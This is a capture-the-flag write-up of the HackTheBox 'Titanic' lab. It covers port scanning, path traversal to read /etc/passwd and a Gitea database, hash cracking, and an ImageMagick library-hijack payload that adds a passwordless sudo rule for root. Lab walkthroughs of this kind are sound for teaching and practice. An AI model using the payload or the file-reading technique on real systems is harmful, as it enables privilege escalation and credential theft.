---------------

### CTF: HACKTHEBOX
### LAB: TITANIC

----------------

![image](https://github.com/user-attachments/assets/c569dd2e-6082-4668-88d7-9d752cab0fcd)

----------------

- Rustscan's result

```bash
❯ rustscan -a titanic.htb -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.55:22
Open 10.10.11.55:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 11:53 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
Initiating Connect Scan at 11:53
Scanning titanic.htb (10.10.11.55) [2 ports]
Discovered open port 80/tcp on 10.10.11.55
Discovered open port 22/tcp on 10.10.11.55
Completed Connect Scan at 11:53, 0.91s elapsed (2 total ports)
Initiating Service scan at 11:53
Scanning 2 services on titanic.htb (10.10.11.55)
Completed Service scan at 11:53, 6.80s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.55.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:54, 6.35s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.88s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.00s elapsed
Nmap scan report for titanic.htb (10.10.11.55)
Host is up, received user-set (0.91s latency).
Scanned at 2025-02-18 11:53:50 WAT for 16s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-favicon: Unknown favicon MD5: 79E1E0A79A613646F473CFEDA9E231F1
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
|_http-title: Titanic - Book Your Ship Trip
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

-  I discovered a subdomain `dev` with ffuf.We'll come back to this later

![image](https://github.com/user-attachments/assets/3c80c7ac-2a3f-40d2-87b8-b7980e04e473)

-  On the main page,there is a route `/book` that helps to submit user forms.Using `Chrome Dev tools`,I noticed that the server makes a `POST` request
to another route `/download` to read files.

![image](https://github.com/user-attachments/assets/0357de7f-837e-42e3-8c69-ccd506d6ee4d)

- I tested the route and was able to read `/etc/passwd`.

![image](https://github.com/user-attachments/assets/0a3a236b-613b-45a5-a10a-7d5de27a0f97)

- There is a user `/developer` on the server who will be our main target till we gain foothold on the server.

```text
developer:x:1000:1000:developer:/home/developer:/bin/bash
```

- `Gitea` runs on the subdomain `dev`.It also contains repositories for the flask app and docker config.

![image](https://github.com/user-attachments/assets/11d61cbc-fd00-4cc6-8bbc-cb32ba1287a5)

- The docker config contains the custom installation directory for gitea.

![image](https://github.com/user-attachments/assets/8aa9ad3d-c0f1-41bb-b543-f4da1be92cdb)

- After checking for necessary backend files for `Gitea`,I discovered the important ones which are `app.ini` and `gitea.db`.The `gitea.db` contains the pbkdf2 hashes for Gitea users which can be cracked.I was able to read it.

![image](https://github.com/user-attachments/assets/32effff5-67b6-4ced-ad11-3db616a6e38f)

- I got a one liner from [Oxdf](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#winrm) to extract and create pbkdf2 hashes

![image](https://github.com/user-attachments/assets/469286d1-2e60-4b25-8d95-038af68a2c8b)

- I cracked it with hashcat as also explained in the writeup

![image](https://github.com/user-attachments/assets/e00a6901-5178-4b40-bccc-e48e7cdde03d)

- SSH access with the password

![image](https://github.com/user-attachments/assets/3b3b0f38-9725-48f6-bd5c-1ae99a9968e9)

-----------------

### PRIVESC-: Image Magick

-----------------

- I discovered this script in `/opt/scripts` that identify images with the `Image magick` binary.

![image](https://github.com/user-attachments/assets/86c903bb-3a5e-4a37-a70f-146f741e4f18)

- This version of image magick is vulnerable to Code Execution as explained here [Image Magick](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8).

![image](https://github.com/user-attachments/assets/784dd5a2-816c-4bc2-b9cd-d805ed93aa97)


- I tweaked the POC to grant root privileges by adding an `all` rule to the `/etc/sudoers` file.

```bash
gcc -x c -shared -fPIC -o /opt/app/static/assets/images/libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
  system("echo 'developer ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers");
  exit(0);
}
EOF
```
- I ran `sudo -l` to confirm if the rule has been added.

![image](https://github.com/user-attachments/assets/9bd940f9-275b-40d7-9dd7-14f87350583f)

- Root-:

![image](https://github.com/user-attachments/assets/387ad12a-6e87-4b98-a70e-2079c3503a6c)

-----------------

### THANKS FOR READING

-----------------

### REFERENCE-:

-----------------

- [Image Magick Code Execution](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)

-----------------











